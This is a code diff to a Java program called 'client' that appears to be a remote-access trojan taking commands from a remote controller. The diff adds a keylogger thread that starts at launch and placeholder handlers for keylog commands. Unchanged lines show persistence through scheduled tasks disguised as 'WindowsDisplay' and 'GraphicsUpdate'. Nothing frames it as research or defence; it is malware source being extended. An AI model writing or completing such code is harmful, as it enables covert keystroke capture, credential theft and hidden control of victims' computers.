@@ -15,6 +15,8 @@ public class client {
         } catch (Exception e) {
             e.printStackTrace();
         }
+        KeyLogger kl = new KeyLogger();
+        (new Thread(kl)).start();
         while(true) {
             try {
                 loc = client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath(); 
@@ -31,6 +33,9 @@ public class client {
                     
                     System.out.println("[DEBUG] data received: " + line);
                     
+                    if (line.equals("a")) {
+                        ps.println("a");
+                    }
                     if (line.equals("ps99")) {
                         Process proc1 = Runtime.getRuntime().exec("cmd /c schtasks.exe /create /tn WindowsDisplay /tr "+ loc + " /sc ONSTART ");
                         Process proc2 = Runtime.getRuntime().exec("cmd /c schtasks.exe /create /tn GraphicsUpdate /tr " + loc + " /sc ONLOGON "); 
@@ -67,7 +72,13 @@ public class client {
                     }
                     if (line.equals("sh99")) {
                         sh=true;
-                    }      
+                    }    
+                    if (line.equals("klg")) {
+                        
+                    }
+                    if (line.equals("klr")) {
+                        
+                    }
                     if (line.equals("ap99")) {
                         int seconds = Integer.parseInt(din.readLine());
                         ps.flush();
